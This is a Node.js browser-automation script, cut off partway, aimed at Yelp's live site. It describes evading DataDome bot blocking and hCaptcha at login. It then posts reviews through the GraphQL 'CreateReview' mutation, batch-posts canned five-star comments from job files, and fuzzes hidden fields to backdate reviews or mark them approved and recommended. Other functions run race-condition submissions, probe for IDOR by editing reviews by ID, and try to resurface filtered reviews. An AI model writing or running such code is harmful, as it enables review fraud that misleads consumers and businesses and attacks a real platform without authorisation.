// flow.js - login exactly as the repo docs specify:
//  1) /login/ served by envoy (never /login, DataDome 403s it; only GET is documented)
//  2) ddok: outerHTML > 200000 and title Log In, else the IP is burned -> new session
//  3) hydrate until #ajax-login + hcaptcha + outerHTML > 400000 (PITFALLS #5)
//  4) arm the page's own widget [data-hcaptcha-widget-id]; self-render only as fallback
//  5) mint: execute, poll 200 ms, 12 s cap; never POST an empty token (PITFALLS #27)
//  6) POST /login/%6E%65%77%61%6A%61%78 with csrftok,email,password,hcaptcha_response
// env: PU_BASE PW EMAIL PASS [ATTEMPTS=4] [PROFILE] [KEEP_PROFILE=1] [CITY] [LOG]
const http=require('http'),net=require('net'),fs=require('fs'),os=require('os'),path=require('path'),{spawn}=require('child_process');
const PU_BASE=process.env.PU_BASE,PW=process.env.PW,EMAIL=process.env.EMAIL,PASS=process.env.PASS;
const ATTEMPTS=parseInt(process.env.ATTEMPTS||'4',10);
const SITEKEY=process.env.SITEKEY||'6660d4df-1884-4ac6-a933-e5f3bd460946';
const LOG=process.env.LOG||path.join(__dirname,'..','runs-recon','flow.log');
fs.mkdirSync(path.dirname(LOG),{recursive:true});
const T=()=>new Date().toISOString().slice(11,23);
const rec=o=>{const l=JSON.stringify(Object.assign({ts:T()},o));try{fs.appendFileSync(LOG,l+'\n');}catch(e){}console.log(l);};
const sleep=ms=>new Promise(r=>setTimeout(r,ms));
const rnd=(a,b)=>a+Math.random()*(b-a);
process.on('uncaughtException',e=>rec({e:'crash',err:String((e&&e.stack)||e).slice(0,300)}));
process.on('unhandledRejection',e=>rec({e:'reject',err:String((e&&e.stack)||e).slice(0,300)}));

// --- review stage: runs in the same logged-in browser (zss is session-only) ---
async function apiPost(ctx){
  const {sendS,ev}=ctx;
  const DOC='e99ac0db780e2a147705ff77cd3e4ab975e4aaf7440148d3884a230577a51c63';
  const ENCID=process.env.ENCID||'';
  const rating=parseInt(process.env.RATING||'5',10);
  const text=process.env.TEXT_FILE?fs.readFileSync(process.env.TEXT_FILE,'utf8').trim():'';
  await sendS('Page.navigate',{url:'https://www.yelp.com/'});
  await sleep(4000);
  rec({e:'api_pre',s:await ev(`JSON.stringify({u:location.href,l:document.documentElement.outerHTML.length})`)});
  const r=await ev(`(async function(){
    var body=[{operationName:'CreateReview',variables:{input:{businessEncid:${JSON.stringify(ENCID)},rating:${rating},comment:${JSON.stringify(text)},reviewOrigin:${JSON.stringify(process.env.REVIEW_ORIGIN||'biz-details-war-button')}}},extensions:{operationType:'mutation',documentId:'${DOC}'}}];
    try{var r=await fetch('/gql/batch',{method:'POST',credentials:'include',headers:{'content-type':'application/json','x-apollo-operation-name':'CreateReview'},body:JSON.stringify(body)});
      return JSON.stringify({s:r.status,b:(await r.text()).slice(0,4000)});}catch(e){return JSON.stringify({s:-1,b:String(e.message)});}})()`);
  rec({e:'api_post',r:String(r).slice(0,900)});
}

async function fuzzFields(ctx){
  const {sendS,ev}=ctx;
  const DOC='e99ac0db780e2a147705ff77cd3e4ab975e4aaf7440148d3884a230577a51c63';
  const enc='AAAAAAAAAAAAAAAAAAAAAA';
  const cands={photos:'x',photoIds:'x',media:'x',checkIn:'x',checkInId:'x',checkInEncid:'x',
    reviewSessionId:'x',topics:'x',reviewTopics:'x',language:'x',locale:'x',device:'x',source:'x',origin:'x',
    createdAt:'x',reviewDate:'x',visitDate:'x',isRecommended:'x',recommended:'x',status:'x',state:'x',
    published:'x',visibility:'x',userId:'x',userEncid:'x',reviewId:'x',reviewEncid:'x',metadata:'x',payload:'x'};
  await sendS('Page.navigate',{url:'https://www.yelp.com/'});await sleep(3500);
  rec({e:'fuzz_pre',s:await ev(`JSON.stringify({u:location.href,l:document.documentElement.outerHTML.length})`)});
  const r=await ev(`(async function(){
    var inp={businessEncid:${JSON.stringify(enc)},rating:5,comment:'x',reviewOrigin:'biz-details-war-button',...${JSON.stringify(cands)}};
    var body=[{operationName:'CreateReview',variables:{input:inp},extensions:{operationType:'mutation',documentId:'${DOC}'}}];
    try{var r=await fetch('/gql/batch',{method:'POST',credentials:'include',headers:{'content-type':'application/json','x-apollo-operation-name':'CreateReview'},body:JSON.stringify(body)});
      return JSON.stringify({s:r.status,b:(await r.text()).slice(0,4000)});}catch(e){return JSON.stringify({s:-1,b:String(e.message)});}})()`);
  rec({e:'fuzz',r:String(r).slice(0,4200)});
}

async function fuzz2(ctx){
  const {sendS,ev}=ctx;
  const DOC='e99ac0db780e2a147705ff77cd3e4ab975e4aaf7440148d3884a230577a51c63';
  const enc='AAAAAAAAAAAAAAAAAAAAAA';
  const cands=['photos','photoIds','media','mediaIds','videos','videoIds','checkIn','checkInId','checkInEncid','checkInBusinessEncid','checkInAt',
    'reviewSessionId','sessionId','draft','draftEncid','topics','reviewTopics','language','locale','device','source','origin','clientId',
    'createdAt','reviewDate','visitDate','visitedAt','isRecommended','recommended','status','state','published','visibility','userId','userEncid',
    'reviewId','reviewEncid','metadata','payload','ip','userAgent','location','latitude','longitude','csrfToken','comment','rating','businessEncid','reviewOrigin'];
  await sendS('Page.navigate',{url:'https://www.yelp.com/'});await sleep(3500);
  for(const c of cands){
    const r=await ev(`(async function(){
      var inp={businessEncid:${JSON.stringify(enc)},rating:5,comment:'x',reviewOrigin:'biz-details-war-button'};
      inp[${JSON.stringify(c)}]='x';
      var body=[{operationName:'CreateReview',variables:{input:inp},extensions:{operationType:'mutation',documentId:'${DOC}'}}];
      try{var r=await fetch('/gql/batch',{method:'POST',credentials:'include',headers:{'content-type':'application/json','x-apollo-operation-name':'CreateReview'},body:JSON.stringify(body)});
        var t=await r.text();var nd=t.indexOf('is not defined by type');var m=(t.match(/Field .{0,4}([A-Za-z]+).{0,4} is not defined/)||[])[1]||'';
        return JSON.stringify({s:r.status,defined:m?false:true,msg:(t.match(/\\"message\\":\\"(.*?)\\"/)||[])[1]?String((t.match(/\\"message\\":\\"(.*?)\\"/)||[])[1]).slice(0,90):'',b:t.slice(0,160)});
      }catch(e){return JSON.stringify({s:-1,b:String(e.message)});}})()`);
    rec({e:'f2',field:c,r:String(r).slice(0,260)});
    await sleep(120);
  }
}

async function raceTest(ctx){
  const {sendS,ev}=ctx;
  const DOC='e99ac0db780e2a147705ff77cd3e4ab975e4aaf7440148d3884a230577a51c63';
  const encid=process.env.ENCID||'';
  const N=parseInt(process.env.N||'5',10);
  const cmt=process.env.CMT||'Stopped by on a quiet morning and the pour over was clean, staff knew the beans, seating was comfortable, and the pastry case looked fresh. Would come back.';
  await sendS('Page.navigate',{url:'https://www.yelp.com/'});await sleep(3500);
  const r=await ev(`(async function(){
    var body=[{operationName:'CreateReview',variables:{input:{businessEncid:${JSON.stringify(encid)},rating:5,comment:${JSON.stringify(cmt)},reviewOrigin:'biz-details-war-button'}},extensions:{operationType:'mutation',documentId:'${DOC}'}}];
    var ps=[];for(var i=0;i<${N};i++){
      ps.push(fetch('/gql/batch',{method:'POST',credentials:'include',headers:{'content-type':'application/json','x-apollo-operation-name':'CreateReview'},body:JSON.stringify(body)}).then(function(r){return r.text();}).catch(function(e){return 'FETCHERR:'+String(e.message);}));
    }
    var rs=await Promise.all(ps);
    return JSON.stringify({n:rs.length,rs:rs.map(function(t){return String(t).slice(0,220);})});})()`);
  rec({e:'race',r:String(r).slice(0,2200)});
}

async function editProbe(ctx){
  const {sendS,ev,nlog}=ctx;
  const encid=process.env.ENCID||'';
  await sendS('Page.navigate',{url:'https://www.yelp.com/writeareview/biz/'+encid+'?return_url=%2Fbiz%2F'+encid+'&review_origin=biz-details-war-button'});
  for(let k=0;k<25;k++){await sleep(800);const s=await ev(`JSON.stringify({l:document.documentElement.outerHTML.length,t:document.title})`);try{const o=JSON.parse(s);if(o.l>200000)break;}catch(e){}}
  const st=await ev(`(function(){var ce=document.querySelector('div[role=textbox][contenteditable]');
    var btns=[].map.call(document.querySelectorAll('button'),function(b){return (b.textContent||'').trim()+'|'+(b.getAttribute('data-testid')||'')+'|'+b.getAttribute('type');}).filter(Boolean);
    return JSON.stringify({t:document.title,u:location.href,ceLen:ce?ce.innerText.length:-1,btns:btns.slice(0,12)});})()`);
  rec({e:'edit_pre',st});
  await ev(`(function(){var ce=document.querySelector('div[role=textbox][contenteditable]');if(!ce)return 0;ce.focus();
    var r=document.createRange();r.selectNodeContents(ce);r.collapse(false);
    var s=window.getSelection();s.removeAllRanges();s.addRange(r);return 1;})()`);
  await sleep(300);
  await sendS('Input.insertText',{text:' Second visit was just as good, the batch brew and the cardamom bun held up.'});
  await sleep(1200);
  const clk=await ev(`(function(){var b=document.querySelector('[data-testid=post-button]')||[].find.call(document.querySelectorAll('button'),function(x){return /save|update|post/i.test(x.textContent||'');});
    if(!b)return 'nobtn';b.click();return 'clicked:'+(b.textContent||'').trim().slice(0,20);})()`);
  rec({e:'edit_click',clk});
  await sleep(6000);
  const ops=await ev(`JSON.stringify({u:location.href,t:document.title,body:(document.body.innerText||'').replace(/\\s+/g,' ').slice(0,180)})`);
  rec({e:'edit_after',ops});
  const items=(nlog||[]).filter(x=>String(x.u).indexOf('/gql')>=0).map(x=>{
    const m=String(x.d).match(/"operationName":"(\w+)"/);const d=String(x.d).match(/"documentId":"([a-f0-9]{32,})"/);
    return {op:m&&m[1],doc:d&&d[1]};}).filter(v=>v.op);
  const uniq=[];for(const it of items){if(!uniq.find(z=>z.op===it.op&&z.doc===it.doc))uniq.push(it);}
  rec({e:'ops',items:uniq.slice(-8)});
}

async function formPost(ctx){
  const {sendS,ev}=ctx;
  const encid=process.env.ENCID||'';
  const marker=process.env.MARKER||'FORMINJECT';
  const txt=marker+': stopped in for a flat white and a cardamom bun, both were good, staff friendly, would return.';
  const url='https://www.yelp.com/writeareview/biz/'+encid+'?return_url=%2Fbiz%2F'+encid+'&review_origin=biz-details-war-button';
  await sendS('Page.navigate',{url});await sleep(8000);
  rec({e:'fp_pre',s:await ev(`JSON.stringify({t:document.title,l:document.documentElement.outerHTML.length})`)});
  const tok=await ev(`(function(){
    var metas=[].map.call(document.querySelectorAll('meta'),function(m){return (m.getAttribute('name')||'')+'='+(m.getAttribute('content')||'').slice(0,40);}).filter(function(s){return /csrf|token/i.test(s);});
    var cfg=window.yConfig?Object.keys(window.yConfig):[];
    var cv=window.yConfig?(window.yConfig.csrfToken||window.yConfig.csrf||window.yConfig.csrf_token||''):'';
    var ins=[].map.call(document.querySelectorAll('input[name*=csrf],input[name*=token]'),function(i){return i.name+'='+String(i.value).slice(0,50);});
    var ck=document.cookie.split(';').map(function(c){return c.trim().split('=')[0];}).filter(function(n){return /csrf|token/i.test(n);});
    var sn=(document.documentElement.innerHTML.match(/csrfToken[^,}]{0,60}/i)||[''])[0];
    return JSON.stringify({metas:metas,cfg:cfg.slice(0,20),cfgval:String(cv).slice(0,50),ins:ins,ck:ck,snip:sn});})()`);
  rec({e:'csrf',tok});
  let CT='';try{const o=JSON.parse(tok);CT=o.cfgval||((o.metas[0]||'').split('=').slice(1).join('='))||'';}catch(e){}
  rec({e:'csrf_used',len:String(CT||'').length});
  const r=await ev(`(async function(){
    var b=new URLSearchParams();
    b.set('csrftok',${JSON.stringify(CT)}); b.set('csrf_token',${JSON.stringify(CT)}); b.set('csrfToken',${JSON.stringify(CT)});
    b.set('rating', '5'); b.set('rating-_R_3aahkdakql9sp_','5'); b.set('review_text',${JSON.stringify(txt)});
    b.set('comment',${JSON.stringify(txt)}); b.set('text',${JSON.stringify(txt)});
    b.set('created_at','2020-01-02'); b.set('review_date','2020-01-02'); b.set('visit_date','2020-01-02');
    b.set('status','approved'); b.set('is_recommended','true'); b.set('recommended','true');
    try{var r=await fetch(${JSON.stringify(url)},{method:'POST',credentials:'include',redirect:'manual',
      headers:{'Content-Type':'application/x-www-form-urlencoded','X-CSRF-Token':${JSON.stringify(CT)},'X-CSRFToken':${JSON.stringify(CT)},'x-csrftoken':${JSON.stringify(CT)}},body:b.toString()});
      var t='';try{t=await r.text();}catch(e){}
      return JSON.stringify({s:r.status,type:r.type,loc:r.headers.get('location')||'',b:t.slice(0,300)});}catch(e){return JSON.stringify({s:-1,b:String(e.message)});}})()`);
  rec({e:'fp_post',r:String(r).slice(0,500)});
  await sleep(1500);
  await sendS('Page.navigate',{url});await sleep(8000);
  const after=await ev(`(function(){var ce=document.querySelector('div[role=textbox][contenteditable]');
    return JSON.stringify({t:document.title,u:location.href,ceLen:ce?ce.innerText.length:-1,ce:(ce?ce.innerText:'').slice(0,200)});})()`);
  rec({e:'fp_after',after});
}

async function fuzz3(ctx){
  const {sendS,ev}=ctx;
  const DOC='455125ba4964e2cf3041036d2b973924ab3fe4ce4ff25bbbc8ee94ef977d9609';
  const rev='AAAAAAAAAAAAAAAAAAAAAA';
  const cands=['reviewEncid','reviewId','encid','id','businessEncid','rating','comment','text','reviewOrigin','photos','reviewSessionId','isRecommended','status','createdAt'];
  await sendS('Page.navigate',{url:'https://www.yelp.com/'});await sleep(3500);
  for(const c of cands){
    const r=await ev(`(async function(){
      var inp={reviewEncid:${JSON.stringify(rev)}};inp[${JSON.stringify(c)}]='x';
      var body=[{operationName:'EditReview',variables:{input:inp},extensions:{operationType:'mutation',documentId:'${DOC}'}}];
      try{var r=await fetch('/gql/batch',{method:'POST',credentials:'include',headers:{'content-type':'application/json','x-apollo-operation-name':'EditReview'},body:JSON.stringify(body)});
        var t=await r.text();var nd=/is not defined by type/.test(t);
        var m=(t.match(/\\"message\\":\\"(.*?)\\"/)||[])[1]||'';
        return JSON.stringify({s:r.status,notdefined:nd,msg:String(m).replace(/\\\\/g,'').slice(0,140)});
      }catch(e){return JSON.stringify({s:-1,msg:String(e.message)});}})()`);
    rec({e:'f3',field:c,r:String(r).slice(0,320)});
    await sleep(120);
  }
}

async function surfaces(ctx){
  const {sendS,ev}=ctx;
  const encid=process.env.ENCID||'';
  const urls=['https://www.yelp.com/biz_photos/'+encid,'https://www.yelp.com/questions/biz/'+encid,'https://www.yelp.com/collections','https://www.yelp.com/user_details_reviews_self'];
  for(const u of urls){
    await sendS('Page.navigate',{url:u});
    let last='';
    for(let k=0;k<20;k++){await sleep(900);last=await ev(`JSON.stringify({u:location.href,t:document.title,l:document.documentElement.outerHTML.length,
      dd:(document.documentElement.innerHTML.match(/captcha-delivery/)||[''])[0]})`);try{const o=JSON.parse(last);if(o.l>60000||o.dd)break;}catch(e){}}
    const d=await ev(`JSON.stringify({u:location.href,t:document.title,l:document.documentElement.outerHTML.length,
      txt:(document.body.innerText||'').replace(/\\s+/g,' ').slice(0,260),
      forms:[].map.call(document.forms,function(f){return (f.getAttribute('action')||'')+':'+f.querySelectorAll('input,textarea').length;}).slice(0,3),
      file:document.querySelectorAll('input[type=file]').length,
      btns:[].map.call(document.querySelectorAll('button'),function(b){return (b.textContent||'').trim().slice(0,18);}).filter(Boolean).slice(0,10)})`);
    rec({e:'surface',url:u,page:last,detail:d});
    await sleep(800);
  }
}

async function counts(ctx){
  const {sendS,ev}=ctx;
  const ids=(process.env.ENCIDS||'').split(',').map(s=>s.trim()).filter(Boolean);
  for(const id of ids){
    await sendS('Page.navigate',{url:'https://www.yelp.com/biz_photos/'+id});
    let last='';
    for(let k=0;k<18;k++){await sleep(900);last=await ev(`JSON.stringify({u:location.href,t:document.title,l:document.documentElement.outerHTML.length})`);try{const o=JSON.parse(last);if(o.l>100000)break;}catch(e){}}
    const d=await ev(`(function(){var t=(document.body.innerText||'').replace(/\\s+/g,' ');
      var m=t.match(/([\\d.]+)\\s*\\(([\\d,]+)\\s+reviews?\\)/);
      return JSON.stringify({u:location.href,t:document.title,rating:m?m[1]:'',count:m?m[2]:'',head:t.slice(0,220)});})()`);
    rec({e:'count',id,page:last,detail:d});
    await sleep(500);
  }
}

async function idor(ctx){
  const {sendS,ev,nlog}=ctx;
  const DOC='455125ba4964e2cf3041036d2b973924ab3fe4ce4ff25bbbc8ee94ef977d9609';
  const rev=process.env.REVIEW_ENCID||'';
  const rating=parseInt(process.env.RATING||'5',10);
  const text=process.env.TEXT_FILE?fs.readFileSync(process.env.TEXT_FILE,'utf8').trim():'IDOR marker';
  const be=process.env.BIZ_ENCID||'';
  const burl='https://www.yelp.com/writeareview/biz/'+be+'?return_url=%2Fbiz%2F'+be+'&review_origin=biz-details-war-button';
  await Promise.race([sendS('Page.navigate',{url:burl}),sleep(12000)]);await sleep(4000);
  rec({e:'idor_pre',s:await ev(`JSON.stringify({u:location.href,l:document.documentElement.outerHTML.length})`)});
  if(!rev){
    const items=(nlog||[]).filter(x=>String(x.u).indexOf('/gql')>=0).map(x=>String(x.d).slice(0,260));
    const uniq=[];for(const it of items){const k=it.match(/"operationName":"(\w+)"/);const key=k?k[1]:it.slice(0,20);if(!uniq.find(z=>z.key===key))uniq.push({key,raw:it});}
    rec({e:'ops',items:uniq});
    return;
  }
  const r=await ev(`(async function(){
    var body=[{operationName:'EditReview',variables:{input:{reviewEncid:${JSON.stringify(rev)},rating:${rating},comment:${JSON.stringify(text)},reviewOrigin:'biz-details-war-button'}},extensions:{operationType:'mutation',documentId:'${DOC}'}}];
    try{var r=await fetch('/gql/batch',{method:'POST',credentials:'include',headers:{'content-type':'application/json','x-apollo-operation-name':'EditReview'},body:JSON.stringify(body)});
      return JSON.stringify({s:r.status,b:(await r.text()).slice(0,500)});}catch(e){return JSON.stringify({s:-1,b:String(e.message)});}})()`);
  rec({e:'idor',r:String(r).slice(0,600)});
}

async function delProbe(ctx){
  const {sendS,ev,nlog}=ctx;
  const SN=process.env.SNIPPET||'';
  await sendS('Page.navigate',{url:'https://www.yelp.com/user_details_reviews_self'});
  await sleep(9000);await ev('window.scrollTo(0,document.body.scrollHeight)');await sleep(2500);
  const d=await ev(`(function(){
    var sn=${JSON.stringify(SN)};
    var all=document.querySelectorAll('div,li,article,section');var card=null;
    for(var i=0;i<all.length;i++){var t=all[i].innerText||'';if(sn&&t.indexOf(sn)>=0&&t.length<6000){if(!card||t.length<card.innerText.length)card=all[i];}}
    var btns=[];var scope=card||document;
    var bs=scope.querySelectorAll('button,a,[role=button]');
    for(var j=0;j<bs.length&&j<25;j++){var b=bs[j];btns.push({tag:b.tagName,al:(b.getAttribute('aria-label')||'').slice(0,40),tid:b.getAttribute('data-testid')||'',tx:(b.textContent||'').trim().slice(0,20),html:b.outerHTML.slice(0,120)});}
    var g=[];var gb=document.querySelectorAll('button[aria-label]');
    for(var k=0;k<gb.length&&k<30;k++){g.push(gb[k].getAttribute('aria-label'));}
    return JSON.stringify({found:!!card,cardLen:card?card.innerText.length:0,cardTxt:card?card.innerText.slice(0,200):'',btns:btns,globalAria:g});})()`);
  rec({e:'del_view',d});
  if(process.env.CLICK==='1'){
    const c=await ev(`(function(){var sn=${JSON.stringify(SN)};
      var cands=document.querySelectorAll('button[aria-label="Menu"],button[aria-label="See more"],button[aria-label="More"]');
      for(var j=0;j<cands.length;j++){var b=cands[j],p=b;
        for(var u=0;u<6&&p;u++){var t=p.innerText||'';
          if(t.indexOf(sn)>=0&&t.length<2500){b.click();return 'clicked:'+(b.getAttribute('aria-label')||'')+':'+j;}p=p.parentElement;}}
      return 'nobtn';})()`);
    rec({e:'del_click',c});
    await sleep(2000);
    const m=await ev(`(function(){var o=[];var els=document.querySelectorAll('[role=menuitem],li a,li button,div[role=menu] *');
      for(var i=0;i<els.length&&o.length<15;i++){var t=(els[i].textContent||'').trim();if(t&&t.length<50)o.push(t);}
      return JSON.stringify({items:o,txt:(document.body.innerText||'').replace(/\\s+/g,' ').slice(-300)});})()`);
    rec({e:'del_menu',m});
    await sleep(1000);
    const ops=(nlog||[]).filter(x=>String(x.u).indexOf('/gql')>=0).map(x=>String(x.d).slice(0,200));
    rec({e:'del_ops',ops:ops.slice(-5)});
  }
}

async function resurrect(ctx){
  const {sendS,ev}=ctx;
  const DOC='455125ba4964e2cf3041036d2b973924ab3fe4ce4ff25bbbc8ee94ef977d9609';
  const be=process.env.BIZ_ENCID||'',rev=process.env.REVIEW_ENCID||'';
  const text=process.env.TEXT_FILE?fs.readFileSync(process.env.TEXT_FILE,'utf8').trim():'';
  const cnt=async(tag)=>{
    for(let a=0;a<3;a++){
      await Promise.race([sendS('Page.navigate',{url:'https://www.yelp.com/biz_photos/'+be}),sleep(12000)]);
      for(let k=0;k<16;k++){await sleep(900);const s=await ev(`(function(){var t=(document.body.innerText||'').replace(/\\s+/g,' ');var m=t.match(/([\\d.]+)\\s*\\(([\\d,]+)\\s+reviews?\\)/);return JSON.stringify({u:location.href,l:document.documentElement.outerHTML.length,rating:m?m[1]:'',count:m?m[2]:''});})()`);try{const o=JSON.parse(s);if(o.count){rec({e:'count',tag,rating:o.rating,count:o.count});return o;}if(o.l>100000&&o.l<3000)break;}catch(e){}}
      await sleep(2000);
    }
    rec({e:'count',tag,failed:true});return null;
  };
  const base=await cnt('before');
  await Promise.race([sendS('Page.navigate',{url:'https://www.yelp.com/writeareview/biz/'+be+'?return_url=%2Fbiz%2F'+be+'&review_origin=biz-details-war-button'}),sleep(12000)]);
  await sleep(5000);
  const r=await ev(`(async function(){var body=[{operationName:'EditReview',variables:{input:{reviewEncid:${JSON.stringify(rev)},rating:5,comment:${JSON.stringify(text)},reviewOrigin:'biz-details-war-button'}},extensions:{operationType:'mutation',documentId:'${DOC}'}}];
    try{var r=await fetch('/gql/batch',{method:'POST',credentials:'include',headers:{'content-type':'application/json','x-apollo-operation-name':'EditReview'},body:JSON.stringify(body)});return JSON.stringify({s:r.status,b:(await r.text()).slice(0,300)});}catch(e){return JSON.stringify({s:-1,b:String(e.message)});}})()`);
  rec({e:'edit',r:String(r).slice(0,400)});
  rec({e:'wait',ms:120000});
  await sleep(120000);
  const after=await cnt('after');
  rec({e:'result',base:base&&base.count,after:after&&after.count});
}

async function probe2(ctx){
  const {sendS,ev}=ctx;
  const SN=process.env.SNIPPET||'';
  await sendS('Page.navigate',{url:'https://www.yelp.com/user_details_reviews_self'});
  await sleep(9000);
  await ev('window.scrollTo(0,document.body.scrollHeight)');await sleep(2500);
  const card=await ev(`(function(){var sn=${JSON.stringify(SN)};
    var all=document.querySelectorAll('div,li,article,section');var best=null;
    for(var i=0;i<all.length;i++){var t=all[i].innerText||'';
      if(sn&&t.indexOf(sn)>=0&&t.length>150&&t.length<5000){
        if(!best||t.length<best.length)best=t;}}
    return JSON.stringify({found:!!best,len:best?best.length:0,txt:best?best.slice(0,1400):''});})()`);
  rec({e:'card',card});
  const raw=await ev(`(async function(){
    try{var r=await fetch('/gql/batch',{method:'POST',credentials:'include',headers:{'content-type':'application/json'},body:JSON.stringify([{query:'query { __typename }'}])});
      return JSON.stringify({s:r.status,b:(await r.text()).slice(0,600)});}catch(e){return JSON.stringify({s:-1,b:String(e.message)});}})()`);
  rec({e:'rawq',raw:String(raw).slice(0,700)});
  const intro=await ev(`(async function(){
    try{var r=await fetch('/gql/batch',{method:'POST',credentials:'include',headers:{'content-type':'application/json'},body:JSON.stringify([{query:'{ __schema { queryType { name } } }'}])});
      return JSON.stringify({s:r.status,b:(await r.text()).slice(0,600)});}catch(e){return JSON.stringify({s:-1,b:String(e.message)});}})()`);
  rec({e:'introspect',intro:String(intro).slice(0,700)});
}

async function apiBatch(ctx){
  const {sendS,ev}=ctx;
  const DOC='e99ac0db780e2a147705ff77cd3e4ab975e4aaf7440148d3884a230577a51c63';
  const jobs=JSON.parse(fs.readFileSync(process.env.JOB_FILE,'utf8').replace(/^\uFEFF/,''));
  await sendS('Page.navigate',{url:'https://www.yelp.com/'});
  await sleep(4000);
  rec({e:'batch_start',n:jobs.length,page:await ev(`JSON.stringify({u:location.href,l:document.documentElement.outerHTML.length})`)});
  let ok=0,fail=0;
  for(const j of jobs){
    const r=await ev(`(async function(){
      var body=[{operationName:'CreateReview',variables:{input:{businessEncid:${JSON.stringify(j.businessEncid)},rating:${j.rating||5},comment:${JSON.stringify(j.comment||'')},reviewOrigin:${JSON.stringify(j.reviewOrigin||'biz-details-war-button')}}},extensions:{operationType:'mutation',documentId:'${DOC}'}}];
      try{var r=await fetch('/gql/batch',{method:'POST',credentials:'include',headers:{'content-type':'application/json','x-apollo-operation-name':'CreateReview'},body:JSON.stringify(body)});
        return JSON.stringify({s:r.status,b:(await r.text()).slice(0,400)});}catch(e){return JSON.stringify({s:-1,b:String(e.message)});}})()`);
    const good=String(r).indexOf('CreateReviewSuccess')>=0;
    if(good)ok++;else fail++;
    rec({e:'batch_item',encid:j.businessEncid,ok:good,resp:String(r).slice(0,320)});
    await sleep(parseInt(process.env.GAP||'1800',10));
  }
  rec({e:'batch_done',ok,fail});
}

async function apiOnly(ctx){
  const {sendS,ev}=ctx;
  const U=process.env.WURL||'https://www.yelp.com/writeareview/biz/B4LHgbuE94FaelDVeDK5cg?return_url=%2Fbiz%2FB4LHgbuE94FaelDVeDK5cg&review_origin=biz-details-war-button';
  await sendS('Page.navigate',{url:U});
  for(let k=0;k<30;k++){await sleep(800);const s=await ev(`JSON.stringify({l:document.documentElement.outerHTML.length,t:document.title})`);try{const o=JSON.parse(s);if(o.l>300000)break;}catch(e){}}
  rec({e:'api_page',s:await ev(`JSON.stringify({u:location.href,l:document.documentElement.outerHTML.length})`)});
  const r=await ev(`(async function(){
    var urls=[];var es=performance.getEntriesByType('resource');
    for(var i=0;i<es.length;i++){var n=es[i].name;if(/\\.js(\\?|$)/.test(n)&&urls.indexOf(n)<0)urls.push(n);}
    var ss=document.querySelectorAll('script[src]');
    for(var s2=0;s2<ss.length;s2++){var n2=ss[s2].src;if(n2&&urls.indexOf(n2)<0)urls.push(n2);}
    var hits=[];
    for(var j=0;j<urls.length&&hits.length<4;j++){
      try{var t=await (await fetch(urls[j])).text();
        var keys=['DeleteReview','RemoveReview','AddPhoto','CheckIn','CreateCollection','EditReview'];
        for(var q=0;q<keys.length;q++){var ix=t.indexOf(keys[q]);if(ix>=0){hits.push({k:keys[q],u:urls[j].slice(0,120),ctx:t.slice(Math.max(0,ix-220),ix+320)});break;}}
      }catch(e){}
    }
    return JSON.stringify({n:urls.length,hits:hits});})()`);
  rec({e:'js_scan',r:String(r).slice(0,3000)});
  rec({e:'done',stage:'api'});
}

async function verifyOnly(ctx){
  const {sendS,ev}=ctx;
  const SN=process.env.SNIPPET||'';
  const st=()=>ev(`JSON.stringify({u:location.href,t:document.title,l:document.documentElement.outerHTML.length,
    txt:(document.body.innerText||'').replace(/\\s+/g,' ').slice(0,700)})`);
  const wait=async(pred,secs)=>{for(let k=0;k<secs*2;k++){const s=await st();if(s==='TIMEOUT')continue;
    try{const o=JSON.parse(s);if(pred(o))return o;}catch(e){}await sleep(500);}return null;};
  for(const u of (process.env.VURLS||'https://www.yelp.com/user_details_reviews_self,https://www.yelp.com/biz/B4LHgbuE94FaelDVeDK5cg').split(',')){
    await sendS('Page.navigate',{url:u});
    const p=await wait(o=>o.l>60000,20);
    if(!p){rec({e:'verify_fail',u});continue;}
    const ectx=await ev(`(function(){var h=document.documentElement.innerHTML;var k=${JSON.stringify(process.env.DUMP_ENCID||'')};var i=k?h.indexOf(k):-1;
      var o={enc:i,rec:-1,rctx:''};
      if(i>=0)o.ctx=h.slice(Math.max(0,i-500),i+700);
      var r=h.toLowerCase();var j=r.indexOf('recommended');o.rec=j;if(j>=0)o.rctx=h.slice(Math.max(0,j-250),j+250);
      return JSON.stringify(o);})()`);
    rec({e:'enc_ctx',ctx:ectx});
    let v=await ev(`JSON.stringify({u:location.href,hit:(document.body.innerText||'').indexOf(${JSON.stringify(SN)})>=0,
      nr:(document.body.innerText||'').toLowerCase().indexOf('not currently recommended')>=0,
      rec:(document.body.innerText||'').toLowerCase().indexOf('recommended')>=0,
      txt:(document.body.innerText||'').replace(/\\s+/g,' ').slice(0,650)})`);
    rec({e:'verify',u,page:p.l,v});
    const clicked=await ev(`(function(){window.scrollTo(0,document.body.scrollHeight);
      var a=[].slice.call(document.querySelectorAll('a,button')).filter(function(x){return /not currently recommended|other reviews/i.test(x.textContent||'');});
      if(a.length){a[0].click();return 'clicked:'+(a[0].textContent||'').trim().slice(0,40);}return 'nolink';})()`);
    rec({e:'nr_click',clicked});
    await sleep(4000);
    v=await ev(`JSON.stringify({u:location.href,hit:(document.body.innerText||'').indexOf(${JSON.stringify(SN)})>=0,
      txt:(document.body.innerText||'').replace(/\\s+/g,' ').slice(0,900)})`);
    rec({e:'verify_after',u,v});
  }
}

async function runReview(ctx){
  const {sendS,ev,nlog}=ctx;
  try{await sendS('DOM.enable');}catch(e){}
  const BIZ=process.env.BIZ||'';
  const RATING=process.env.RATING||'5';
  const SUBMIT=process.env.SUBMIT==='1';
  const TEXT=process.env.TEXT_FILE?fs.readFileSync(process.env.TEXT_FILE,'utf8').trim():process.env.TEXT||'';
  const st=()=>ev(`JSON.stringify({u:location.href,t:document.title,l:document.documentElement.outerHTML.length,
    z:(document.cookie.match(/zss=([^;]+)/)||[])[1]?1:0,
    txt:(document.body.innerText||'').replace(/\\s+/g,' ').slice(0,220)})`);
  const wait=async(pred,secs,label)=>{for(let k=0;k<secs*2;k++){const s=await st();if(s==='TIMEOUT'){continue;}
    try{const o=JSON.parse(s);if(pred(o))return o;}catch(e){}await sleep(500);}return null;};
  let bizUrl=/^https?:/.test(BIZ)?BIZ:(BIZ?('https://www.yelp.com/biz/'+BIZ.replace(/^\/?(biz\/)?/,'')):'');
  if(!bizUrl){
    const su=process.env.SEARCH_URL||('https://www.yelp.com/search?find_desc='+encodeURIComponent(process.env.DESC||'Restaurants')+'&find_loc='+encodeURIComponent(process.env.LOC||'Dallas, TX'));
    await sendS('Page.navigate',{url:su});
    const sp=await wait(o=>o.l>120000,20,'search');
    rec({e:'search_page',u:sp&&sp.u,l:sp&&sp.l,t:sp&&sp.t,z:sp&&sp.z,txt:sp&&sp.txt});
